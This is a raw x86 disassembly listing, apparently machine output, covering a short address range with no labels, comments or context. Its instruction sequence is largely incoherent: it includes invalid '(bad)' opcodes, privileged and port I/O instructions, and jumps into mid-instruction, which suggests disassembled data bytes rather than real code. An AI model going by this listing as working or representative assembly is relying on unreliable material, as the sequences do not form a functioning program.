  4117c1:	std    
  4117c2:	mov    bh,0x7
  4117c4:	mov    al,ds:0xb6d6a052
  4117c9:	sub    ebp,ebx
  4117cb:	and    bh,BYTE PTR [ecx]
  4117cd:	xchg   ecx,eax
  4117ce:	repnz loopne 0x411762
  4117d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d2:	pusha  
  4117d3:	imul   ch
  4117d5:	dec    ecx
  4117d6:	jno    0x4117b5
  4117d8:	sub    al,0x49
  4117da:	xor    esi,DWORD PTR [eax-0x60]
  4117dd:	lods   eax,DWORD PTR ds:[esi]
  4117de:	jne    0x411801
  4117e0:	inc    esp
  4117e1:	dec    eax
  4117e2:	call   0x757c3c5a
  4117e7:	data16 repz cmp ah,BYTE PTR cs:[ecx-0x26d5b1c8]
  4117f0:	pop    esi
  4117f1:	ja     0x4117fb
  4117f3:	sahf   
  4117f4:	test   DWORD PTR [esi-0x47],edi
  4117f7:	xchg   edx,eax
  4117f8:	je     0x411843
  4117fa:	aad    0xf7
  4117fc:	inc    ecx
  4117fd:	and    eax,ecx
  4117ff:	push   DWORD PTR [edi+eiz*8-0x182d26ce]
  411806:	(bad)  
  411807:	aam    0x46
  411809:	mov    cl,0x86
  41180b:	jo     0x411855
  41180d:	jle    0x41179b
  41180f:	adc    ebx,edi
  411811:	imul   edi,DWORD PTR [ecx],0x31
  411814:	pop    ss
  411815:	cwde   
  411816:	push   ecx
  411817:	jo     0x4117bf
  411819:	mov    dh,cl
  41181b:	lods   eax,DWORD PTR ds:[esi]
  41181c:	xchg   esi,eax
  41181d:	mov    cl,0xf1
  41181f:	mov    cl,0x4e
  411821:	mov    bh,0x78
  411823:	fld    QWORD PTR [esi]
  411825:	mov    eax,ds:0xe9844b24
  41182a:	inc    edx
  41182b:	shr    ch,1
  41182d:	mov    WORD PTR [edx+0x76124c3e],?
  411833:	repz das 
  411835:	mul    BYTE PTR [edx]
  411837:	lds    esi,FWORD PTR [ebp-0x701c45a4]
  41183d:	popf   
  41183e:	cdq    
  41183f:	lds    edx,FWORD PTR [ecx+0x1da8764a]
  411845:	in     eax,0x28
  411847:	aas    
  411848:	jne    0x411885
  41184a:	pop    edx
  41184b:	or     esi,DWORD PTR ds:0x565a30e1
  411851:	inc    ecx
  411852:	sub    BYTE PTR [esi-0x3a229145],dl
  411858:	fdiv   QWORD PTR [esi-0x63]
  41185b:	lea    ecx,[ebp-0x2d3afba0]
  411861:	test   DWORD PTR [ebx+0x4c59a772],esp
  411867:	mov    BYTE PTR [eax+0x1a96a7da],dl
  41186d:	clc    
  41186e:	mov    bl,0x9d
  411870:	pop    edx
  411871:	(bad)  
  411872:	jg     0x411867
  411874:	sbb    al,0x39
  411876:	sbb    eax,0x3c70e3e5
  41187b:	jbe    0x411856
  41187d:	nop
  41187e:	(bad)  
  41187f:	lds    ebx,FWORD PTR [edi+0x1e]
  411882:	sbb    DWORD PTR [ecx-0x4c],edx
  411885:	push   0xf58bf870
  41188a:	in     al,0x56
  41188c:	std    
  41188d:	mov    dh,0xa4
  41188f:	out    0x46,al
  411891:	enter  0x9434,0xb9
  411895:	cmc    
  411896:	mov    eax,0xff730b4
  41189b:	pop    esi
  41189c:	das    
  41189d:	cmp    al,0xf8
  41189f:	mov    edi,0xcc599e86
  4118a4:	call   0xcab4e6c
  4118a9:	push   ds
  4118aa:	icebp  
  4118ab:	dec    ebp
  4118ac:	(bad)  cs:[eax-0x64c14d29]
  4118b3:	stc    
  4118b4:	add    ecx,edi
  4118b6:	fist   WORD PTR [edx]
  4118b8:	push   ds
  4118b9:	shr    DWORD PTR [esp+eax*1],1
  4118bc:	in     al,0x18
  4118be:	outs   dx,DWORD PTR ds:[esi]
  4118bf:	fcmovb st,st(0)
  4118c1:	test   al,0x86
  4118c3:	adc    BYTE PTR [edx+0x389be056],cl
  4118c9:	cmc    
  4118ca:	stc    
  4118cb:	pop    ss
  4118cc:	add    bh,ah
  4118ce:	mov    eax,0x69f7d675
  4118d3:	add    BYTE PTR [ebx+0x588bab4a],0x36
  4118da:	ret    
  4118db:	inc    ecx
  4118dc:	mov    al,ds:0xe7b97881
  4118e1:	(bad)  
  4118e2:	outs   dx,DWORD PTR ds:[esi]
  4118e3:	fwait
  4118e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118e5:	lods   eax,DWORD PTR ds:[esi]
  4118e6:	adc    esp,esp
  4118e8:	inc    edx
  4118e9:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4118eb:	jl     0x411881
  4118ed:	and    al,0xb1
  4118ef:	mov    esi,0x69632af2
  4118f4:	pop    ebx
  4118f5:	jbe    0x4118ab
  4118f7:	outs   dx,DWORD PTR ds:[esi]
  4118f8:	sbb    al,0xd1
  4118fa:	inc    ecx
  4118fb:	dec    edi
  4118fc:	lea    esp,[ebp-0xe]
  4118ff:	dec    ebx
  411900:	dec    eax
  411901:	and    al,0xe1
  411903:	stos   DWORD PTR es:[edi],eax
  411904:	fadd   QWORD PTR [edi+0x4fc7df86]
  41190a:	test   edi,ebx
  41190c:	inc    esp
  41190d:	pop    ebx
  41190e:	jnp    0x4118a7
  411910:	ret    
  411911:	mov    eax,ds:0xccca9435
  411916:	arpl   WORD PTR [ebx-0x3d],ax
  411919:	shr    BYTE PTR [ecx+0x552cd946],cl
  41191f:	jl     0x411962
  411921:	jp     0x41194f
  411923:	stc    
  411924:	arpl   WORD PTR [eax+0x1a],dx
  411927:	jbe    0x4119a5
  411929:	and    edi,edx
  41192b:	dec    esp
  41192c:	ds scas eax,DWORD PTR es:[edi]
  41192e:	outs   dx,DWORD PTR ds:[esi]
  41192f:	inc    edi
  411930:	cs push edx
  411932:	cmp    eax,0x9d719966
  411937:	xchg   esi,eax
  411938:	jg     0x41195b
  41193a:	push   ds
  41193b:	xor    DWORD PTR [eax],esp
  41193d:	repnz out dx,eax
  41193f:	fsubr  QWORD PTR [ecx]
  411941:	cmc    
  411942:	ds in  eax,dx
  411944:	cmp    BYTE PTR [ebx-0x1a],dl
  411947:	cwde   
  411948:	fs cld 
  41194a:	imul   edx,edx,0x7c9597ef
  411950:	test   edi,0x35cd0bc5
  411956:	in     eax,0x84
  411958:	sbb    eax,DWORD PTR [ecx]
  41195a:	jno    0x411904
  41195c:	(bad)  
  41195d:	pop    edx
  41195e:	dec    esi
  41195f:	jbe    0x411979
  411961:	scas   eax,DWORD PTR es:[edi]
  411962:	and    al,0x3b
  411964:	out    dx,al
  411965:	call   0xa9c92a41
  41196a:	lods   eax,DWORD PTR ds:[si]
  41196c:	ins    DWORD PTR es:[edi],dx
  41196d:	jnp    0x411990
  41196f:	scas   eax,DWORD PTR es:[edi]
  411970:	cmp    al,0xc2
  411972:	imul   ebp,DWORD PTR [esi+edx*4],0xc174fb4a
  411979:	mov    esi,0xac060d11
  41197e:	(bad)  
  411980:	call   0x7082:0x3e263930
  411987:	nop
  411988:	mov    gs,esp
  41198a:	mov    eax,0x6c22c61b
  41198f:	or     DWORD PTR [edx+0x1f],edx
  411992:	mov    esi,0xb15a8880
  411997:	xchg   BYTE PTR [edi+0x402cab70],dh
  41199d:	push   ebx
  41199e:	mov    cs:0xc7214a59,al
  4119a4:	retf   
  4119a5:	push   ss
  4119a6:	jecxz  0x411944
  4119a8:	jl     0x411932
  4119aa:	mov    dh,0x6b
  4119ac:	nop
  4119ad:	cli    
  4119ae:	inc    ecx
  4119af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b0:	sahf   
  4119b1:	and    al,0x5b
  4119b3:	hlt    
  4119b4:	vmread ecx,ebp
  4119b7:	sub    BYTE PTR [ecx+0x57],cl
  4119ba:	out    dx,eax
  4119bb:	mov    ebp,esi
  4119bd:	sub    al,0x10
  4119bf:	sub    al,0xaa
  4119c1:	into   
  4119c2:	fimul  DWORD PTR [ebp-0x4d897481]
  4119c8:	mov    eax,ds:0x61555541
  4119cd:	inc    ecx
  4119ce:	inc    ebx
  4119cf:	pushf  
  4119d0:	xchg   esi,eax
  4119d1:	out    0x8a,al
  4119d3:	rol    BYTE PTR [edi-0x3f],cl
  4119d6:	adc    DWORD PTR [edx-0x4b],edi
  4119d9:	adc    DWORD PTR [edi*1-0x566e00f5],edi
  4119e0:	cmp    DWORD PTR [esi+0x39],esp
  4119e3:	lods   al,BYTE PTR ds:[esi]
  4119e5:	pusha  
  4119e6:	xchg   dh,dh
  4119e8:	jb     0x411a54
  4119ea:	or     BYTE PTR [esi],dl
  4119ec:	and    edx,ecx
  4119ee:	jnp    0x411979
  4119f0:	push   edi
  4119f1:	cs loopne 0x411a10
  4119f4:	jl     0x4119b0
  4119f6:	scas   eax,DWORD PTR es:[edi]
  4119f7:	or     eax,esp
  4119f9:	xchg   esi,eax
  4119fa:	pop    eax
  4119fb:	loopne 0x4119af
  4119fd:	ins    BYTE PTR es:[edi],dx
  4119fe:	add    esp,ebx
  411a00:	and    al,0x9f
  411a02:	push   0xf91e5269
  411a07:	mov    DWORD PTR [ebp-0x58],ebx
  411a0a:	mov    BYTE PTR [ecx+0x6ae4d1e2],al
  411a10:	popf   
  411a11:	sub    ecx,0x36186142
  411a17:	iret   
  411a18:	das    
  411a19:	sub    DWORD PTR [esi-0x73c0411d],eax
  411a1f:	loop   0x411a8e
  411a21:	outs   dx,DWORD PTR ds:[esi]
  411a22:	(bad)  
  411a23:	and    DWORD PTR [eax-0x5f],ebx
  411a26:	xor    BYTE PTR [edx+0x2b],0x3f
  411a2a:	xor    BYTE PTR [ebx+0x50],0xe8
  411a2e:	ins    BYTE PTR es:[edi],dx
  411a2f:	test   BYTE PTR [esi-0x45ee0577],cl
  411a35:	test   BYTE PTR [ebx+ecx*8],0xed
  411a39:	scas   al,BYTE PTR es:[edi]
  411a3a:	mov    ebp,0x71747a88
  411a3f:	jno    0x411a11
  411a41:	pop    ss
  411a42:	or     BYTE PTR [edx+0x7c],dl
  411a45:	mov    ebx,0x27287fc6
  411a4a:	sbb    DWORD PTR [ebx-0x60c3fe3c],edx
  411a50:	stos   BYTE PTR es:[edi],al
  411a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a52:	xor    bl,bl
  411a54:	and    DWORD PTR [ebx-0x7a],edi
  411a57:	add    al,0xce
  411a59:	jl     0x411ad0
  411a5b:	jg     0x411aae
  411a5d:	outs   dx,BYTE PTR ds:[esi]
  411a5e:	jge    0x411abd
  411a60:	stos   BYTE PTR es:[edi],al
  411a61:	mov    cl,0x7
  411a63:	ins    BYTE PTR es:[edi],dx
  411a64:	out    dx,eax
  411a65:	inc    ebx
  411a66:	lods   al,BYTE PTR ds:[esi]
  411a67:	lods   al,BYTE PTR ds:[esi]
  411a68:	and    ecx,DWORD PTR [esi+ebx*8]
  411a6b:	arpl   WORD PTR [eax+0x25],di
  411a6e:	and    eax,0xe078b066
  411a73:	xor    esi,ecx
  411a75:	popf   
  411a76:	leave  
  411a77:	dec    esp
  411a78:	fldpi  
  411a7a:	ja     0x411a4f
  411a7c:	(bad)  
  411a7d:	call   DWORD PTR [esi+esi*1-0x77]
  411a81:	push   ecx
  411a82:	enter  0x54bf,0x10
  411a86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a87:	popf   
  411a88:	(bad)  
  411a89:	sahf   
  411a8a:	aas    
  411a8b:	out    dx,eax
  411a8c:	ja     0x411a97
  411a8e:	into   
  411a8f:	mov    al,0x80
  411a91:	inc    esp
  411a92:	sar    BYTE PTR [ecx+edi*4-0x5537753],cl
  411a99:	outs   dx,BYTE PTR ds:[esi]
  411a9a:	repz dec BYTE PTR [ebx+0x72]
  411a9e:	push   esi
  411a9f:	jae    0x411a42
  411aa1:	stos   DWORD PTR es:[edi],eax
  411aa2:	stos   BYTE PTR es:[edi],al
  411aa3:	pop    ebp
  411aa4:	or     BYTE PTR [esi],cl
  411aa6:	or     DWORD PTR [ecx-0x7d],0xaa947fe8
  411aad:	das    
  411aae:	test   al,0x2
  411ab0:	rol    BYTE PTR gs:[ebx+0x55],0x48
  411ab5:	dec    ebx
  411ab6:	or     DWORD PTR [ebx-0x2832b80a],eax
  411abc:	bswap  ecx
  411abe:	fisub  DWORD PTR [esi+eiz*4-0x5c]
  411ac2:	dec    edx
  411ac3:	cmp    al,0x73
  411ac5:	fcmovbe st,st(4)
  411ac7:	push   edx
  411ac8:	and    BYTE PTR [ebp+esi*2+0x70],ch
  411acc:	lock dec edi
  411ace:	loop   0x411b14
  411ad0:	shl    BYTE PTR [ebp+0x21],0x41
  411ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad5:	gs xor al,0xbb
  411ad8:	xchg   DWORD PTR [ebx],ebp
  411ada:	sub    al,0x55
  411adc:	dec    eax
  411add:	mov    ebx,DWORD PTR [eax-0x62]
  411ae0:	xchg   ebp,eax
  411ae1:	pop    ss
  411ae2:	lahf   
  411ae3:	lods   al,BYTE PTR ds:[esi]
  411ae4:	ja     0x411b52
  411ae6:	or     eax,0xb7e85974
  411aeb:	gs xchg edi,eax
  411aed:	sbb    cl,ah
  411aef:	adc    DWORD PTR [ebp-0x24],esp
  411af2:	xchg   DWORD PTR [edx+0x3c],esi
  411af5:	sub    al,0x7b
  411af7:	or     eax,0x5f7ee247
  411afc:	mov    WORD PTR ds:0x18c53c8d,fs
  411b02:	out    0xaf,al
  411b04:	mov    DWORD PTR [ecx-0x25dcc2ba],esp
  411b0a:	fistp  DWORD PTR [ecx-0x2ff7761e]
  411b10:	retf   
  411b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b13:	push   ebp
  411b14:	cli    
  411b15:	(bad)  
  411b16:	pop    ebx
  411b17:	mov    bl,BYTE PTR [ecx-0x3562735c]
  411b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b1e:	leave  
  411b1f:	adc    dl,BYTE PTR [ebx]
  411b21:	push   0x2b7c9e83
  411b26:	mov    gs,WORD PTR [eax+0x1c]
  411b29:	nop
  411b2a:	in     al,dx
  411b2b:	cmc    
  411b2c:	push   eax
  411b2d:	mov    esi,0x28ff1b4e
  411b32:	mov    esi,DWORD PTR [ecx]
  411b34:	scas   al,BYTE PTR es:[edi]
  411b35:	cmp    al,BYTE PTR [esi+0x44]
  411b38:	xor    ch,BYTE PTR [eax+0x285ff251]
  411b3e:	sbb    ah,dl
  411b40:	retf   
  411b41:	pop    ebp
  411b42:	enter  0xe924,0xf2
  411b46:	dec    ebx
  411b47:	fs pop esi
  411b49:	hlt    
  411b4a:	or     edi,DWORD PTR [ecx-0x1442706c]
  411b50:	pop    ss
  411b51:	ins    BYTE PTR es:[edi],dx
  411b52:	sbb    ah,BYTE PTR [ebx-0x7fb09323]
  411b58:	mov    bh,0xde
  411b5a:	addr16 add bh,ah
  411b5d:	xchg   edi,eax
  411b5e:	fistp  DWORD PTR [edx]
  411b60:	jo     0x411b88
  411b62:	xlat   BYTE PTR ds:[ebx]
  411b63:	mov    eax,ds:0xa411e471
  411b68:	jnp    0x411bd3
  411b6a:	sbb    al,0x5e
  411b6c:	lds    esi,FWORD PTR [eax]
  411b6e:	aam    0xa7
  411b70:	add    al,0xe6
  411b72:	ss imul edx,ebp,0xc08f7756
  411b79:	or     al,al
  411b7b:	imul   esi,DWORD PTR [eax+ecx*2],0x5a
  411b7f:	ret    
  411b80:	js     0x411bbb
  411b82:	pop    ds
  411b83:	sahf   
  411b84:	enter  0x19b2,0x57
  411b88:	xchg   edx,eax
  411b89:	cwde   
  411b8a:	les    ebx,FWORD PTR [esi+0x4cc48438]
  411b90:	dec    edx
  411b91:	shr    DWORD PTR [esi],0xd0
  411b94:	inc    ebx
  411b95:	test   eax,0xa35e4201
  411b9a:	add    eax,DWORD PTR [ebx+0xa]
  411b9d:	loop   0x411b32
  411b9f:	test   al,0x7
  411ba1:	out    0xac,eax
  411ba3:	dec    edi
  411ba4:	xchg   esi,ecx
  411ba6:	jbe    0x411b2c
  411ba8:	mov    cl,0xd5
  411baa:	or     DWORD PTR [eax+0x74669b49],eax
  411bb0:	add    DWORD PTR [edi+0x46],edx
  411bb3:	mov    dl,BYTE PTR [eax+0x72]
  411bb6:	jo     0x411b8f
  411bb8:	cwde   
  411bb9:	mov    ds:0x8d0c7c2a,al
  411bbe:	sub    eax,DWORD PTR [esi]
  411bc0:	xchg   esp,eax
  411bc1:	xchg   ebx,eax
  411bc2:	fst    QWORD PTR [edi+edi*1]
  411bc5:	adc    DWORD PTR [edx],ebx
  411bc7:	push   esp
  411bc8:	push   eax
  411bc9:	int    0xcf
  411bcb:	jg     0x411b78
  411bcd:	(bad)  
  411bce:	sub    al,0xff
  411bd0:	dec    ecx
  411bd1:	xchg   ebx,eax
  411bd2:	call   0x2de:0x6ec1b6ba
  411bd9:	das    
  411bda:	push   es
  411bdb:	cs test al,0x78
  411bde:	cmc    
  411bdf:	shr    BYTE PTR [esi],0x21
  411be2:	out    0xbf,eax
  411be4:	icebp  
  411be5:	xchg   esp,eax
  411be6:	rcr    DWORD PTR [ebp-0x3d201050],0x24
  411bed:	xchg   edx,eax
  411bee:	inc    edx
  411bef:	sub    DWORD PTR [edx+0x53403032],ecx
  411bf5:	dec    ebp
  411bf6:	in     eax,dx
  411bf7:	test   DWORD PTR [esi-0x5],esi
  411bfa:	imul   ebp,DWORD PTR [ecx+0x5b72bcda],0xbac08409
  411c04:	shl    DWORD PTR [eax],cl
  411c06:	xchg   esi,eax
  411c07:	jl     0x411bf2
  411c09:	cmp    ch,cl
  411c0b:	inc    eax
  411c0c:	pop    esi
  411c0d:	imul   ebp,DWORD PTR [ecx+0xa9186b4],0xe49f06e3
  411c17:	je     0x411c78
  411c19:	fadd   QWORD PTR [ebp-0x7f]
  411c1c:	jp     0x411c8e
  411c1e:	loopne 0x411bae
  411c20:	push   eax
  411c21:	pop    esi
  411c22:	ja     0x411c2a
  411c24:	inc    esp
  411c25:	div    DWORD PTR [ecx-0x7d5e13b1]
  411c2b:	or     bh,BYTE PTR [ebx]
  411c2d:	aam    0x1a
  411c2f:	sbb    eax,0xfc18fa9a
  411c34:	xchg   DWORD PTR [ebx],eax
  411c36:	dec    esp
  411c37:	and    al,0x41
  411c39:	push   ebp
  411c3a:	lds    edx,FWORD PTR [esi]
  411c3c:	cmp    eax,0xcd34a09d
  411c41:	adc    eax,0x18a43a1f
  411c46:	pusha  
  411c47:	and    eax,0x5a2c9e22
  411c4c:	and    DWORD PTR [edx-0x35],esi
  411c4f:	inc    edx
  411c50:	aam    0x61
  411c52:	shr    DWORD PTR [ecx-0x14],cl
  411c55:	add    bh,ah
  411c57:	clc    
  411c58:	sti    
  411c59:	jnp    0x411bfd
  411c5b:	pop    bx
  411c5d:	sub    al,0x95
  411c5f:	stos   BYTE PTR es:[edi],al
  411c60:	add    BYTE PTR [ecx+0xb],bl
  411c63:	pop    ds
  411c64:	mov    eax,0x1d27b0d9
  411c69:	pushf  
  411c6a:	push   esp
  411c6b:	dec    esi
  411c6c:	pop    eax
  411c6d:	or     BYTE PTR [ecx-0x5b6d7e70],0xa1
  411c74:	cmp    ch,ch
  411c76:	push   0x633f4abf
  411c7b:	stos   BYTE PTR es:[edi],al
  411c7c:	jae    0x411c76
  411c7e:	inc    edi
  411c7f:	out    0xee,eax
  411c81:	retf   
  411c82:	(bad)  
  411c83:	jmp    0x8a4d:0x19dd13da
  411c8a:	push   esi
  411c8b:	gs xchg ebp,eax
  411c8d:	loope  0x411c27
  411c8f:	sti    
  411c90:	jecxz  0x411cc6
  411c92:	int3   
  411c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c94:	cdq    
  411c95:	(bad)  
  411c96:	out    0xd1,eax
  411c98:	add    eax,0x324ff7b9
  411c9d:	pop    ecx
  411c9e:	(bad)  
  411c9f:	mov    esp,0x92a2b78d
  411ca4:	jnp    0x411c42
  411ca6:	mov    edx,0xcec8a674
  411cab:	daa    
  411cac:	inc    edi
  411cad:	int3   
  411cae:	jae    0x411cdf
  411cb0:	and    eax,DWORD PTR [edi+0x65]
  411cb3:	retf   0x2070
  411cb6:	repnz sti 
  411cb8:	inc    ebp
  411cb9:	xor    ebx,DWORD PTR [ecx+0x9]
  411cbc:	add    ebp,DWORD PTR [ebx-0x6b001be4]
  411cc2:	(bad)  
  411cc3:	mov    ah,0x3b
  411cc5:	push   ecx
  411cc6:	push   0xf8ce380a
  411ccb:	adc    al,0xf6
  411ccd:	rol    DWORD PTR [edx+0x4847f902],0x31
  411cd4:	ins    DWORD PTR es:[edi],dx
  411cd5:	mov    esp,DWORD PTR [edi]
  411cd7:	dec    ecx
  411cd8:	cmp    al,0x46
  411cda:	and    DWORD PTR [ebx+0x4b],edi
  411cdd:	xlat   BYTE PTR ds:[ebx]
  411cde:	add    BYTE PTR [edi],dl
  411ce0:	pop    edi
  411ce1:	sub    eax,0x4ec0e36a
  411ce6:	js     0x411ca7
  411ce8:	arpl   WORD PTR [edx+ebx*4],bx
  411ceb:	pop    ss
  411cec:	imul   DWORD PTR [ebp+0x30936c8e]
  411cf2:	ja     0x411d0c
  411cf4:	das    
  411cf5:	(bad)  
  411cf6:	mov    ds,WORD PTR [ebx]
  411cf8:	das    
  411cf9:	inc    ebx
  411cfa:	sbb    al,BYTE PTR [ebx-0x1d]
  411cfd:	push   cs
  411cfe:	sbb    DWORD PTR [ecx-0x79],edx
  411d01:	cmp    al,BYTE PTR [ebp+ebx*1+0x58]
  411d05:	inc    esp
  411d06:	das    
  411d07:	mov    cl,0xb2
  411d09:	data16 mov WORD PTR [edi+ecx*8+0x499511ff],ss
  411d11:	int    0x75
  411d13:	pop    ebp
  411d14:	push   es
  411d15:	mov    bh,0xab
  411d17:	inc    ecx
  411d18:	fst    QWORD PTR ds:0x7b4ad328
  411d1e:	test   cl,al
  411d20:	xor    DWORD PTR [esi+0x60d4f62b],ecx
  411d26:	ins    DWORD PTR es:[edi],dx
  411d27:	pop    es
  411d28:	(bad)  
  411d29:	push   esp
  411d2a:	cmp    ebp,DWORD PTR [eax+0x3a]
  411d2d:	xor    al,ah
  411d2f:	or     esi,DWORD PTR [ebx-0x3fd32b31]
  411d35:	xor    DWORD PTR [ebp-0x21],ebx
  411d38:	scas   eax,DWORD PTR es:[edi]
  411d39:	in     eax,0x80
  411d3b:	fcmovnbe st,st(4)
  411d3d:	mov    ds:0x2238f9e5,al
  411d42:	jg     0x411d63
  411d44:	add    al,0x63
  411d46:	(bad)  
  411d48:	xor    eax,0x6fa6397
  411d4d:	inc    esp
  411d4e:	add    edx,DWORD PTR [eax-0x50]
  411d51:	add    eax,0x1fd24e41
  411d56:	cmp    esi,DWORD PTR [edi+0x63b7d1f6]
  411d5c:	mov    bl,BYTE PTR fs:[edi+0x22]
  411d60:	add    al,0xe
  411d62:	mov    ebx,0xc136af4a
  411d67:	es sbb eax,0x8fcfe2ed
  411d6d:	adc    BYTE PTR [edx+edx*2+0x4b2760c],bh
  411d74:	fmulp  st(6),st
  411d76:	call   0xe210:0x8dbe7717
  411d7d:	es int 0x25
  411d80:	out    dx,al
  411d81:	pushf  
  411d82:	stc    
  411d83:	lods   al,BYTE PTR ds:[esi]
  411d84:	sub    ch,cl
  411d86:	dec    esp
  411d87:	xchg   edx,eax
  411d88:	pusha  
  411d89:	or     eax,0xf0ddfac6
  411d8e:	add    BYTE PTR [edi],dh
  411d90:	aas    
  411d91:	or     DWORD PTR [ecx],ebp
  411d93:	pop    ebx
  411d94:	pop    ss
  411d95:	sar    BYTE PTR ds:[eax+0x7e],0x27
  411d9a:	repz ret 
  411d9c:	xor    BYTE PTR [ebp-0x31],0x3c
  411da0:	stc    
  411da1:	push   ss
  411da2:	jne    0x411dee
  411da4:	adc    eax,0x70558403
  411da9:	pop    ebp
  411daa:	test   DWORD PTR [ebx],ecx
  411dac:	xchg   ecx,eax
  411dad:	rcl    BYTE PTR [ecx],0xec
  411db0:	stc    
  411db1:	xchg   esi,eax
  411db2:	pop    esi
  411db3:	in     eax,0x6e
  411db5:	stos   BYTE PTR es:[edi],al
  411db6:	mov    dl,0x93
  411db8:	test   al,0x2d
  411dba:	sub    DWORD PTR [ebp+0x13],esp
  411dbd:	shr    DWORD PTR [eax+0x25],cl
  411dc0:	push   cs
  411dc1:	int    0x76
  411dc3:	sub    BYTE PTR [edx+eiz*1+0x72450874],ah
  411dca:	jb     0x411ddc
  411dcc:	mov    dl,0x6f
  411dce:	cmp    edx,edx
  411dd0:	mov    al,0x87
  411dd2:	adc    BYTE PTR [ecx-0x2d],bh
  411dd5:	retf   
  411dd6:	call   0x6cb0:0x39aa46d4
  411ddd:	std    
  411dde:	sub    DWORD PTR [ecx+0x3be41d2f],0xffffffda
  411de5:	aam    0x1e
  411de7:	push   0xffffff98
  411de9:	ja     0x411dcc
  411deb:	cs inc ebx
  411ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dee:	xor    al,0xf4
  411df0:	push   cs
  411df1:	icebp  
  411df2:	inc    edi
  411df3:	adc    al,0x7e
  411df5:	mov    dl,0x60
  411df7:	loopne 0x411d8f
  411df9:	adc    cl,BYTE PTR [edx]
  411dfb:	pusha  
  411dfc:	xor    al,0x26
  411dfe:	add    cl,0xc4
  411e01:	enter  0x7d55,0x28
  411e05:	inc    ebx
  411e06:	or     eax,0xf10ae88b
  411e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e0c:	dec    eax
  411e0d:	jp     0x411e29
  411e0f:	sub    al,ch
  411e11:	pop    es
  411e12:	imul   ebx,DWORD PTR [edi+ebx*4+0x41],0xfc6f8316
  411e1a:	mov    al,ds:0x32b50b36
  411e1f:	sbb    BYTE PTR [esi-0x70d3f73],0xad
  411e26:	dec    edi
  411e27:	inc    esp
  411e28:	dec    ebp
  411e29:	jg     0x411e09
  411e2b:	push   ebx
  411e2c:	or     eax,0x77add9c3
  411e31:	loope  0x411dca
  411e33:	xlat   BYTE PTR ds:[ebx]
  411e34:	sahf   
  411e35:	mov    cl,0x5b
  411e37:	mov    DWORD PTR [eax-0x7],ebp
  411e3a:	sbb    al,0x41
  411e3c:	(bad)  
  411e3d:	shr    ch,0xa2
  411e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e41:	in     al,dx
  411e42:	js     0x411e26
  411e44:	rcl    BYTE PTR [edx-0xf],1
  411e47:	xor    eax,0xa8ad0e0c
  411e4c:	add    eax,0x8aa7658e
  411e51:	jae    0x411e17
  411e53:	xchg   DWORD PTR ds:0x1a8145f9,esi
  411e59:	cdq    
  411e5a:	addr16 jp 0x411e35
  411e5d:	xor    al,0xc
  411e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e60:	arpl   WORD PTR [ebx+0x50],bp
  411e63:	loopne 0x411e94
  411e65:	lahf   
  411e66:	xor    al,0x7c
  411e68:	jecxz  0x411e40
  411e6a:	cld    
  411e6b:	xlat   BYTE PTR ds:[ebx]
  411e6c:	fistp  DWORD PTR [eax]
  411e6e:	and    esi,DWORD PTR [ebx+0x6a6ece63]
  411e74:	adc    eax,0xc46073d8
  411e79:	test   DWORD PTR [ecx-0x741669b9],edi
  411e7f:	test   BYTE PTR [ebp+0x22],al
  411e82:	sar    BYTE PTR [eax],0x58
  411e85:	cs mov ah,al
  411e88:	outs   dx,DWORD PTR ds:[esi]
  411e89:	adc    ebx,DWORD PTR [edi+0x60]
  411e8c:	adc    BYTE PTR [edx-0x1f],dh
  411e8f:	sar    DWORD PTR [eax],1
  411e91:	pusha  
  411e92:	inc    BYTE PTR [edi]
  411e94:	int3   
  411e95:	and    eax,0xf9223495
  411e9a:	in     al,dx
  411e9b:	pop    ss
  411e9c:	cs retf 
  411e9e:	mov    edi,0x8b6d4a7c
  411ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ea4:	stos   BYTE PTR es:[edi],al
  411ea5:	aaa    
  411ea6:	(bad)  
  411ea7:	clc    
  411ea8:	lods   al,BYTE PTR ds:[esi]
  411ea9:	adc    DWORD PTR [ebx-0x7a],edx
  411eac:	push   ds
  411ead:	inc    edi
  411eae:	cmp    DWORD PTR [eax],0xffffffdb
  411eb1:	dec    esi
  411eb2:	push   ebx
  411eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb4:	pusha  
  411eb5:	sbb    DWORD PTR [ecx-0x37],esi
  411eb8:	push   0x1f
  411eba:	outs   dx,DWORD PTR ds:[esi]
  411ebb:	add    DWORD PTR [ecx],esi
  411ebd:	daa    
  411ebe:	jmp    0x411e97
  411ec0:	and    dl,ch
  411ec2:	ins    DWORD PTR es:[edi],dx
  411ec3:	arpl   WORD PTR [ebp+0x1f972699],bx
  411ec9:	mov    bl,ch
  411ecb:	push   ebp
  411ecc:	mov    ds:0x97b07d6f,al
  411ed1:	lock aam 0x8
  411ed4:	shl    BYTE PTR [edx+0x5ed96452],1
  411eda:	mov    BYTE PTR ds:0x4f514b78,cl
  411ee0:	and    eax,esp
  411ee2:	pop    esi
  411ee3:	push   esi
  411ee4:	outs   dx,DWORD PTR ds:[esi]
  411ee5:	jle    0x411e8f
  411ee7:	pop    eax
  411ee8:	in     eax,0xf8
  411eea:	pusha  
  411eeb:	dec    esp
  411eec:	and    edx,DWORD PTR [eax+0x46]
  411eef:	shl    DWORD PTR [edi],0x2e
  411ef2:	jp     0x411eb9
  411ef4:	fst    QWORD PTR [esi-0x45]
  411ef7:	jnp    0x411f0e
  411ef9:	outs   dx,DWORD PTR ds:[esi]
  411efa:	and    edx,DWORD PTR [edi]
  411efc:	test   eax,0x4a4bcb5a
  411f01:	add    al,BYTE PTR [edx+0x778c6087]
